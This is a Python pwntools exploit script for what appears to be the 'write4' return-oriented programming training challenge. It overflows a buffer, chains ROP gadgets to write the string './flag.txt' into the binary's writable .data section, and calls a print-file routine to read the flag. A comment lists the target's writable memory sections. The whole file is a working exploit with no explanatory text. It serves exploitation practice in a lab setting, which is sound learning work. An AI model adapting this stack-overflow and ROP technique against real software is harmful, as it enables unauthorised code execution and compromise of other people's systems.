from sys import byteorder
from pwn import *

'''
writable sections:

18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss

lib  .bss -> 0x201068
main .bss -> 0x601038

good address? 0x600fa0


'''


#io = gdb.debug('./write4', 'b pwnme')
io = process('./write4')

p = b'A' * 40

# main
write32 = lambda x, y: p64(0x400691) + p64(y) + p64(0x1337) + p64(0x400693) + p64(x) + p64(0x400629) 
# 0x0000000000400629 : mov dword ptr [rsi], edi ; ret
# 0x0000000000400691 : pop rsi ; pop r15 ; ret

start = 0x601028
data = './flag.txt'

for i in range(0, len(data), 4):
    d = data[i:i+4].ljust(4, '\x00')
    p += write32(int.from_bytes(d.encode(), byteorder='little'), start+i)

#p += write32(0xcafebabe, 0x601038)

p += p64(0x400693) # pop rdi ; ret
p += p64(start)
p += p64(0x00400510) # printfile

io.sendline(p)
io.interactive()
